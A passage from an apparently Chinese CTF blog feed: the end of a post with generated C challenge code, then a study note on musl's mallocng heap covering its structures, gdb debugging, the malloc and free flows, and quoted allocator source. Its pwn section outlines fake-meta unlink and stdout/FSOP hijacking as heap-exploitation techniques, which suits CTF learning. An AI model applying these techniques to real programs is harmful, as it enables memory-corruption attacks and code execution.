Qanux092(<span class="number">92</span>);</span><br><span class="line">    Qanux093(<span class="number">93</span>);</span><br><span class="line">    Qanux094(<span class="number">94</span>);</span><br><span class="line">    Qanux095(<span class="number">95</span>);</span><br><span class="line">    Qanux096(<span class="number">96</span>);</span><br><span class="line">    Qanux097(<span class="number">97</span>);</span><br><span class="line">    Qanux098(<span class="number">98</span>);</span><br><span class="line">    Qanux099(<span class="number">99</span>);</span><br><span class="line">    Qanux100(<span class="number">100</span>);</span><br><span class="line">    Qanux101(<span class="number">101</span>);</span><br><span class="line">    Qanux102(<span class="number">102</span>);</span><br><span class="line">    Qanux103(<span class="number">103</span>);</span><br><span class="line">    Qanux104(<span class="number">104</span>);</span><br><span class="line">    Qanux105(<span class="number">105</span>);</span><br><span class="line">    Qanux106(<span class="number">106</span>);</span><br><span class="line">    Qanux107(<span class="number">107</span>);</span><br><span class="line">    Qanux108(<span class="number">108</span>);</span><br><span class="line">    Qanux109(<span class="number">109</span>);</span><br><span class="line">    Qanux110(<span class="number">110</span>);</span><br><span class="line">    Qanux111(<span class="number">111</span>);</span><br><span class="line">    Qanux112(<span class="number">112</span>);</span><br><span class="line">    Qanux113(<span class="number">113</span>);</span><br><span class="line">    Qanux114(<span class="number">114</span>);</span><br><span class="line">    Qanux115(<span class="number">115</span>);</span><br><span class="line">    Qanux116(<span class="number">116</span>);</span><br><span class="line">    Qanux117(<span class="number">117</span>);</span><br><span class="line">    Qanux118(<span class="number">118</span>);</span><br><span class="line">    Qanux119(<span class="number">119</span>);</span><br><span class="line">    Qanux120(<span class="number">120</span>);</span><br><span class="line">    Qanux121(<span class="number">121</span>);</span><br><span class="line">    Qanux122(<span class="number">122</span>);</span><br><span class="line">    Qanux123(<span class="number">123</span>);</span><br><span class="line">    Qanux124(<span class="number">124</span>);</span><br><span class="line">    Qanux125(<span class="number">125</span>);</span><br><span class="line">    Qanux126(<span class="number">126</span>);</span><br><span class="line">    Qanux127(<span class="number">127</span>);</span><br><span class="line">    Qanux128(<span class="number">128</span>);</span><br><span class="line">    Qanux129(<span class="number">129</span>);</span><br><span class="line">    Qanux130(<span class="number">130</span>);</span><br><span class="line">    Qanux131(<span class="number">131</span>);</span><br><span class="line">    Qanux132(<span class="number">132</span>);</span><br><span class="line">    Qanux133(<span class="number">133</span>);</span><br><span class="line">    Qanux134(<span class="number">134</span>);</span><br><span class="line">    Qanux135(<span class="number">135</span>);</span><br><span class="line">    Qanux136(<span class="number">136</span>);</span><br><span class="line">    Qanux137(<span class="number">137</span>);</span><br><span class="line">    Qanux138(<span class="number">138</span>);</span><br><span class="line">    Qanux139(<span class="number">139</span>);</span><br><span class="line">    Qanux140(<span class="number">140</span>);</span><br><span class="line">    Qanux141(<span class="number">141</span>);</span><br><span class="line">    Qanux142(<span class="number">142</span>);</span><br><span class="line">    Qanux143(<span class="number">143</span>);</span><br><span class="line">    Qanux144(<span class="number">144</span>);</span><br><span class="line">    Qanux145(<span class="number">145</span>);</span><br><span class="line">    Qanux146(<span class="number">146</span>);</span><br><span class="line">    Qanux147(<span class="number">147</span>);</span><br><span class="line">    Qanux148(<span class="number">148</span>);</span><br><span class="line">    Qanux149(<span class="number">149</span>);</span><br><span class="line">    Qanux150(<span class="number">150</span>);</span><br><span class="line">    Qanux151(<span class="number">151</span>);</span><br><span class="line">    Qanux152(<span class="number">152</span>);</span><br><span class="line">    Qanux153(<span class="number">153</span>);</span><br><span class="line">    Qanux154(<span class="number">154</span>);</span><br><span class="line">    Qanux155(<span class="number">155</span>);</span><br><span class="line">    Qanux156(<span class="number">156</span>);</span><br><span class="line">    Qanux157(<span class="number">157</span>);</span><br><span class="line">    Qanux158(<span class="number">158</span>);</span><br><span class="line">    Qanux159(<span class="number">159</span>);</span><br><span class="line">    Qanux160(<span class="number">160</span>);</span><br><span class="line">    Qanux161(<span class="number">161</span>);</span><br><span class="line">    Qanux162(<span class="number">162</span>);</span><br><span class="line">    Qanux163(<span class="number">163</span>);</span><br><span class="line">    Qanux164(<span class="number">164</span>);</span><br><span class="line">    Qanux165(<span class="number">165</span>);</span><br><span class="line">    Qanux166(<span class="number">166</span>);</span><br><span class="line">    Qanux167(<span class="number">167</span>);</span><br><span class="line">    Qanux168(<span class="number">168</span>);</span><br><span class="line">    Qanux169(<span class="number">169</span>);</span><br><span class="line">    Qanux170(<span class="number">170</span>);</span><br><span class="line">    Qanux171(<span class="number">171</span>);</span><br><span class="line">    Qanux172(<span class="number">172</span>);</span><br><span class="line">    Qanux173(<span class="number">173</span>);</span><br><span class="line">    Qanux174(<span class="number">174</span>);</span><br><span class="line">    Qanux175(<span class="number">175</span>);</span><br><span class="line">    Qanux176(<span class="number">176</span>);</span><br><span class="line">    Qanux177(<span class="number">177</span>);</span><br><span class="line">    Qanux178(<span class="number">178</span>);</span><br><span class="line">    Qanux179(<span class="number">179</span>);</span><br><span class="line">    Qanux180(<span class="number">180</span>);</span><br><span class="line">    Qanux181(<span class="number">181</span>);</span><br><span class="line">    Qanux182(<span class="number">182</span>);</span><br><span class="line">    Qanux183(<span class="number">183</span>);</span><br><span class="line">    Qanux184(<span class="number">184</span>);</span><br><span class="line">    Qanux185(<span class="number">185</span>);</span><br><span class="line">    Qanux186(<span class="number">186</span>);</span><br><span class="line">    Qanux187(<span class="number">187</span>);</span><br><span class="line">    Qanux188(<span class="number">188</span>);</span><br><span class="line">    Qanux189(<span class="number">189</span>);</span><br><span class="line">    Qanux190(<span class="number">190</span>);</span><br><span class="line">    Qanux191(<span class="number">191</span>);</span><br><span class="line">    Qanux192(<span class="number">192</span>);</span><br><span class="line">    Qanux193(<span class="number">193</span>);</span><br><span class="line">    Qanux194(<span class="number">194</span>);</span><br><span class="line">    Qanux195(<span class="number">195</span>);</span><br><span class="line">    Qanux196(<span class="number">196</span>);</span><br><span class="line">    Qanux197(<span class="number">197</span>);</span><br><span class="line">    Qanux198(<span class="number">198</span>);</span><br><span class="line">    Qanux199(<span class="number">199</span>);</span><br><span class="line">    Qanux200(<span class="number">200</span>);</span><br><span class="line">    Qanux201(<span class="number">201</span>);</span><br><span class="line">    Qanux202(<span class="number">202</span>);</span><br><span class="line">    Qanux203(<span class="number">203</span>);</span><br><span class="line">    Qanux204(<span class="number">204</span>);</span><br><span class="line">    Qanux205(<span class="number">205</span>);</span><br><span class="line">    Qanux206(<span class="number">206</span>);</span><br><span class="line">    Qanux207(<span class="number">207</span>);</span><br><span class="line">    Qanux208(<span class="number">208</span>);</span><br><span class="line">    Qanux209(<span class="number">209</span>);</span><br><span class="line">    Qanux210(<span class="number">210</span>);</span><br><span class="line">    Qanux211(<span class="number">211</span>);</span><br><span class="line">    Qanux212(<span class="number">212</span>);</span><br><span class="line">    Qanux213(<span class="number">213</span>);</span><br><span class="line">    Qanux214(<span class="number">214</span>);</span><br><span class="line">    Qanux215(<span class="number">215</span>);</span><br><span class="line">    Qanux216(<span class="number">216</span>);</span><br><span class="line">    Qanux217(<span class="number">217</span>);</span><br><span class="line">    Qanux218(<span class="number">218</span>);</span><br><span class="line">    Qanux219(<span class="number">219</span>);</span><br><span class="line">    Qanux220(<span class="number">220</span>);</span><br><span class="line">    Qanux221(<span class="number">221</span>);</span><br><span class="line">    Qanux222(<span class="number">222</span>);</span><br><span class="line">    Qanux223(<span class="number">223</span>);</span><br><span class="line">    Qanux224(<span class="number">224</span>);</span><br><span class="line">    Qanux225(<span class="number">225</span>);</span><br><span class="line">    Qanux226(<span class="number">226</span>);</span><br><span class="line">    Qanux227(<span class="number">227</span>);</span><br><span class="line">    Qanux228(<span class="number">228</span>);</span><br><span class="line">    Qanux229(<span class="number">229</span>);</span><br><span class="line">    Qanux230(<span class="number">230</span>);</span><br><span class="line">    Qanux231(<span class="number">231</span>);</span><br><span class="line">    Qanux232(<span class="number">232</span>);</span><br><span class="line">    Qanux233(<span class="number">233</span>);</span><br><span class="line">    Qanux234(<span class="number">234</span>);</span><br><span class="line">    Qanux235(<span class="number">235</span>);</span><br><span class="line">    Qanux236(<span class="number">236</span>);</span><br><span class="line">    Qanux237(<span class="number">237</span>);</span><br><span class="line">    Qanux238(<span class="number">238</span>);</span><br><span class="line">    Qanux239(<span class="number">239</span>);</span><br><span class="line">    Qanux240(<span class="number">0</span>);</span><br><span class="line">    Qanux241(<span class="number">0xe0</span>);</span><br><span class="line">    Qanux242(<span class="number">0x77</span>);</span><br><span class="line">    Qanux243(<span class="number">0</span>);</span><br><span class="line">    Qanux244(<span class="number">0</span>);</span><br><span class="line">    Qanux245(<span class="number">0</span>);</span><br><span class="line">    Qanux246(<span class="number">0</span>);</span><br><span class="line">    Qanux247(<span class="number">0</span>);</span><br><span class="line">    Qanux248(<span class="number">248</span>);</span><br><span class="line">    Qanux249(<span class="number">249</span>);</span><br><span class="line">    Qanux250(<span class="number">250</span>);</span><br><span class="line">    Qanux251(<span class="number">251</span>);</span><br><span class="line">    Qanux252(<span class="number">252</span>);</span><br><span class="line">    Qanux253(<span class="number">253</span>);</span><br><span class="line">    Qanux254(<span class="number">254</span>);</span><br><span class="line">    Qanux255(<span class="number">255</span>);</span><br><span class="line">    Qanux240(<span class="number">666</span>);</span><br><span class="line">    Qanux241(<span class="number">666</span>);</span><br><span class="line">    Qanux242(<span class="number">666</span>);</span><br><span class="line">    Qanux243(<span class="number">666</span>);</span><br><span class="line">    Qanux244(<span class="number">666</span>);</span><br><span class="line">    Qanux245(<span class="number">666</span>);</span><br><span class="line">    Qanux246(<span class="number">666</span>);</span><br><span class="line">    Qanux247(<span class="number">666</span>);</span><br><span class="line">    fight(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考：<br><a href="https://zhuanlan.zhihu.com/p/122522485?utm_id=0">https://zhuanlan.zhihu.com/p/122522485?utm_id=0</a><br><a href="https://bbs.kanxue.com/thread-273119.htm#msg_header_h1_0">https://bbs.kanxue.com/thread-273119.htm#msg_header_h1_0</a><br><a href="https://bbs.kanxue.com/thread-274259.htm#msg_header_h2_6">https://bbs.kanxue.com/thread-274259.htm#msg_header_h2_6</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>初探musl</title>
      <link href="/2024/01/17/musl/"/>
      <url>/2024/01/17/musl/</url>
      
        <content type="html"><![CDATA[<p>其实就是对各位大佬博客的各种摘抄和总结···，方便自己以后做题</p><h2 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h2><p>chunk:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line"> <span class="type">char</span> prev_user_data[];</span><br><span class="line">    <span class="type">uint8_t</span> idx;  <span class="comment">//低5bit为idx第几个chunk</span></span><br><span class="line">    <span class="type">uint16_t</span> offset; <span class="comment">//与第一个chunk起始地址的偏移，实际地址偏移为offset * UNIT,详细请看get_meta源码中得到group地址的而过程！</span></span><br><span class="line">    <span class="type">char</span> data[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在释放后 <code>chunk</code> 头的 <code>idx</code>会变成<code>0xff</code> <code>offset</code> 会清零</p><h3 id="group"><a href="#group" class="headerlink" title="group:"></a>group:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> UNIT 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IB 4</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> active_idx:<span class="number">5</span>;</span><br><span class="line">    <span class="type">char</span> pad[UNIT - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta *) - <span class="number">1</span>];<span class="comment">//padding=0x10B</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> storage[];<span class="comment">// chunks</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在<code>musl</code>中同一类大小的<code>chunk</code>都是被分配到同一个<code>group</code>中进行管理</p><h3 id="meta"><a href="#meta" class="headerlink" title="meta:"></a>meta:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span><span class="comment">//双向链表</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span><span class="comment">// 这里指向管理的group 地址</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> avail_mask, freed_mask;<span class="comment">// bitmap 的形式体现 chunk 的状态</span></span><br><span class="line">    <span class="type">uintptr_t</span> last_idx:<span class="number">5</span>;</span><br><span class="line">    <span class="type">uintptr_t</span> freeable:<span class="number">1</span>;<span class="comment">// 代表meta否可以被回收 freeable=0 代表不可以 =1 代表可以</span></span><br><span class="line">    <span class="type">uintptr_t</span> sizeclass:<span class="number">6</span>;<span class="comment">// sizeclass=6 表示由0x6这个group进行管理这一类的大小的chunk</span></span><br><span class="line">    <span class="type">uintptr_t</span> maplen:<span class="number">8</span>*<span class="keyword">sizeof</span>(<span class="type">uintptr_t</span>)<span class="number">-12</span>;<span class="comment">// meta-&gt;maplen = (needed+4095)/4096</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>maplen &gt;&#x3D; 1表示这个<code>meta</code>里的<code>group</code>是新<code>mmap</code>出来的,长度为多少,并且这个<code>group</code> 不在<code>size_classes</code>里<br>maplen &#x3D;0 表示<code>group</code>不是新<code>mmap</code>出来的在<code>size_classes</code>里<br>细节：</p><ul><li><code>meta</code>一般申请的是堆空间<code>brk</code>分配的，有可能是<code>mmap</code>映射的，而<code>group</code>都是使用的<code>mmap</code>的空间</li><li>由于<code>bitmap</code>的限制,因此一个<code>group</code>中最多只能有<code>32</code>个<code>chunk</code></li></ul><h3 id="meta-area"><a href="#meta-area" class="headerlink" title="meta_area:"></a>meta_area:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> check;<span class="comment">// 是个校验数字 保护meta_area 里的meta，防止meta被 伪造</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span><span class="comment">// 指向下一个meta_area 如果没有 就默认为0</span></span><br><span class="line">    <span class="type">int</span> nslots;<span class="comment">// meta 槽的数量</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>meta_area 是管理<code>meta</code>的合集 <code>meta_area</code> 以页为单位分配</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> <span class="title">area</span> =</span> (<span class="type">void</span> )((<span class="type">uintptr_t</span>)meta &amp; <span class="number">-4096</span>)</span><br></pre></td></tr></table></figure><p>细节：</p><ul><li>在这个<code>meta_area</code>页被使用的时候，上一个临近的页会被设置为不可写是为了防止 使用者覆盖<code>check</code>校验值</li></ul><h3 id="malloc-context"><a href="#malloc-context" class="headerlink" title="__malloc_context:"></a>__malloc_context:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> secret;<span class="comment">// 和meta_area 头的check 是同一个值 就是校验值</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PAGESIZE</span></span><br><span class="line">    <span class="type">size_t</span> pagesize;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">int</span> init_done;<span class="comment">//是否初始化标记</span></span><br><span class="line">    <span class="type">unsigned</span> mmap_counter;<span class="comment">// 记录有多少mmap 的内存的数量</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">free_meta_head</span>;</span><span class="comment">// 被free 的meta 头 这里meta 管理使用了队列和双向循环链表</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">avail_meta</span>;</span><span class="comment">//指向可用meta数组</span></span><br><span class="line">    <span class="type">size_t</span> avail_meta_count, avail_meta_area_count, meta_alloc_shift;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">meta_area_head</span>, *<span class="title">meta_area_tail</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *avail_meta_areas;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">active</span>[48];</span><span class="comment">// 记录着可用的meta</span></span><br><span class="line">    <span class="type">size_t</span> u sage_by_class[<span class="number">48</span>];</span><br><span class="line">    <span class="type">uint8_t</span> unmap_seq[<span class="number">32</span>], bounces[<span class="number">32</span>];</span><br><span class="line">    <span class="type">uint8_t</span> seq;</span><br><span class="line">    <span class="type">uintptr_t</span> brk;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>是<code>musl libc</code>记录结构状态的表，记录各个<code>meta</code> 和 <code>secret</code> 队列信息等</p><h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><ul><li><code>musl</code> 中堆的管理由<code>meta</code> 管理 <code>group</code> ，<code>group</code> 管理 <code>chunk</code></li><li>在<code>free</code> 或者 <code>malloc chunk</code> 的时候又是从 <code>chunk</code> 到<code>group</code> 再到<code>meta</code> 从小到大索引</li><li><code>meta</code> 间通过<code>meta</code> 中<code>prev next</code> 结构形成循环链表连接</li></ul><h2 id="gdb调试技巧"><a href="#gdb调试技巧" class="headerlink" title="gdb调试技巧"></a>gdb调试技巧</h2><p>下载<code>xf1le</code>师傅的<code>gdb</code>插件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/xf1les/muslheap.git  </span><br><span class="line">echo &quot;source /path/to/muslheap.py&quot; &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure><h3 id="mheap"><a href="#mheap" class="headerlink" title="mheap"></a>mheap</h3><p>可以查看<code>__malloc_context</code>的部分信息，可以详细看到每一条<code>meta</code>链表</p><img src="/2024/01/17/musl/1.png" class="" title="我的图图呢">  <h3 id="p-malloc-context"><a href="#p-malloc-context" class="headerlink" title="p __malloc_context"></a>p __malloc_context</h3><p>可以查看<code>__malloc_context</code>的详细信息，但无法详细看到每一条<code>meta</code>链表</p><img src="/2024/01/17/musl/2.png" class="" title="我的图图呢">  <h3 id="mmagic"><a href="#mmagic" class="headerlink" title="mmagic"></a>mmagic</h3><p>用于查看关键函数的地址</p><img src="/2024/01/17/musl/3.png" class="" title="我的图图呢">  <h3 id="p-struct-meta"><a href="#p-struct-meta" class="headerlink" title="p (struct meta)&lt;meta地址&gt;"></a>p <em>(struct meta</em>)&lt;meta地址&gt;</h3><p>查看某个<code>meta</code>结构体的详细信息</p><img src="/2024/01/17/musl/4.png" class="" title="我的图图呢">  <h2 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h2><p>这里直接贴上<code>0xRGz</code>师傅的文章</p><img src="/2024/01/17/musl/5.png" class="" title="我的图图呢">  <h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><p>这里一样直接贴上<code>0xRGz</code>师傅的文章<code>Orz</code><br>free流程：</p><ul><li>通过<code>get_meta(p)</code>得到<code>meta</code> (<code>get_meta</code> 是通过<code>chunk</code> 对应的<code>offset</code> 索引到对应的<code>group</code> 再索引到<code>meta</code>) 下面会详细介绍<code>get_meta</code></li><li>通过<code>get_slot_index(p)</code>得到对应<code>chunk</code>的 <code>idx</code> -&gt; 通过<code>get_nominal_size(p, end)</code> 算出真实大小</li><li>重置<code>idx</code> 和 <code>offset idx</code> 被置为<code>0xff</code> 标记<code>chunk</code></li><li>修改<code>freed_mask</code> 标记<code>chunk</code>被释放</li><li>最后调用<code>nontrivial_free</code> 完成关于<code>meta</code>一些剩余操作</li></ul><h2 id="pwn题常用技巧"><a href="#pwn题常用技巧" class="headerlink" title="pwn题常用技巧"></a>pwn题常用技巧</h2><p>一般有如下几种利用方法，核心原理都是构造假的<code>chunk</code> 索引到假的<code>group</code> 从而所引导假的<code>meta</code>或覆盖<code>group</code> 中指向<code>meta</code> 的指针 覆盖为假的<code>meta</code> ，然后使得假的<code>meta dequeue</code> 最终实现<code>unlink</code><br>(构造<code>fake_meta</code> 需要先泄露 <code>secret</code> 校验值)<br>1、伪造<code>meta</code> 后满足各种条件 使得其进入<code>dequeue</code> 通过<code>unlink</code>,构造<code>prev</code>,<code>next</code> 实现任意地址指针互写<br>通过任意地址互写指针，向<code>stdout_used</code> 写入我们伪造的<code>fake_stdout</code>地址， 通过<code>IO_FILE</code> 劫持程序执行流<br>到我们布置好的<code>fake_stdout</code> 上，可以找<code>IO_FILE</code> 里的一些函数<code>exit puts</code>在<code>fake_stdout</code>上布置<code>rop_chain</code>然后通过栈迁移的<code>gadget</code> 利用<code>FSOP</code> 劫持程序到布置的<code>fake_stdout</code>上<br>2、伪造<code>fake_meta</code> 也是任意地址指针互写，先进行布局使得 <code>fake_meta dequeue</code> 实现<code>unlink</code>，再利用指针互写 修改<code>fake_meta</code> 中的<code>mem</code>(<code>mem</code> 就是<code>group</code> 区域) ，把<code>mem</code> 修改为我们想要的地址，然后让<code>fake_meta</code> 通过<code>queue</code> 入队，可以实现任意地址分配的，然后同样是打 <code>IO_FILE</code> 通过修改<code>stdout stdin</code> 和<code>stderr</code> 结构体 劫持程序流</p><h2 id="补充：部分重要函数源码"><a href="#补充：部分重要函数源码" class="headerlink" title="补充：部分重要函数源码"></a>补充：部分重要函数源码</h2><h3 id="malloc-1"><a href="#malloc-1" class="headerlink" title="malloc"></a>malloc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">malloc</span><span class="params">(<span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (size_overflows(n)) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">// 最大申请空间限制</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span>;</span></span><br><span class="line">    <span class="type">uint32_t</span> mask, first;</span><br><span class="line">    <span class="type">int</span> sc;</span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">    <span class="type">int</span> ctr;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (n &gt;= MMAP_THRESHOLD) &#123;<span class="comment">// size &gt;= 阈值 会直接通过mmap 申请空间</span></span><br><span class="line">        <span class="type">size_t</span> needed = n + IB + UNIT; <span class="comment">//UNIT 0x10 IB 4 定义在meta.h 里 这里UNIT + IB 是一个基本头的大小</span></span><br><span class="line">        <span class="type">void</span> *p = mmap(<span class="number">0</span>, needed, PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);<span class="comment">//新mmap group 空间</span></span><br><span class="line">        <span class="keyword">if</span> (p==MAP_FAILED) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        wrlock();</span><br><span class="line">        step_seq();</span><br><span class="line">        g = alloc_meta();</span><br><span class="line">        <span class="keyword">if</span> (!g) &#123; <span class="comment">// 如果申请meta 失败 会把刚刚mmap 出来的group 回收</span></span><br><span class="line">            unlock();</span><br><span class="line">            munmap(p, needed);<span class="comment">// 回收group</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        g-&gt;mem = p;<span class="comment">// mem = group 地址</span></span><br><span class="line">        g-&gt;mem-&gt;meta = g; <span class="comment">//group 头部 指向meta (g 为 meta)</span></span><br><span class="line">        g-&gt;last_idx = <span class="number">0</span>;<span class="comment">//mmap的group last_idx默认值=0</span></span><br><span class="line">        g-&gt;freeable = <span class="number">1</span>;</span><br><span class="line">        g-&gt;sizeclass = <span class="number">63</span>; <span class="comment">// mmap 的申请的 sizeclass 都为63</span></span><br><span class="line">        g-&gt;maplen = (needed+<span class="number">4095</span>)/<span class="number">4096</span>;</span><br><span class="line">        g-&gt;avail_mask = g-&gt;freed_mask = <span class="number">0</span>;</span><br><span class="line">        ctx.mmap_counter++;<span class="comment">// mmap 内存记载数量++</span></span><br><span class="line">        idx = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">goto</span> success;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//否则直接根据传入size，转换成size_classes的对应大小的 下标，</span></span><br><span class="line">    sc = size_to_class(n);</span><br><span class="line"> </span><br><span class="line">    rdlock();</span><br><span class="line">    g = ctx.active[sc]; <span class="comment">// 从现有的active中取出对应sc 的 meta ,不同sc 对应不同的meta</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    如果从ctx.active 中没找到对应的meta 会执行下面的if分支</span></span><br><span class="line"><span class="comment">    这里!g&lt;=&gt; g==0 ,说明ctx.active[sc] 没有对应的meta</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (!g &amp;&amp; sc&gt;=<span class="number">4</span> &amp;&amp; sc&lt;<span class="number">32</span> &amp;&amp; sc!=<span class="number">6</span> &amp;&amp; !(sc&amp;<span class="number">1</span>) &amp;&amp; !ctx.usage_by_class[sc]) &#123;</span><br><span class="line">        <span class="type">size_t</span> usage = ctx.usage_by_class[sc|<span class="number">1</span>];<span class="comment">// 如果在 ctx.active 没找到 就使用更大size group 的meta</span></span><br><span class="line">        <span class="comment">// if a new group may be allocated, count it toward</span></span><br><span class="line">        <span class="comment">// usage in deciding if we can use coarse class.</span></span><br><span class="line">        <span class="keyword">if</span> (!ctx.active[sc|<span class="number">1</span>] || (!ctx.active[sc|<span class="number">1</span>]-&gt;avail_mask</span><br><span class="line">            &amp;&amp; !ctx.active[sc|<span class="number">1</span>]-&gt;freed_mask))</span><br><span class="line">            usage += <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">if</span> (usage &lt;= <span class="number">12</span>)</span><br><span class="line">            sc |= <span 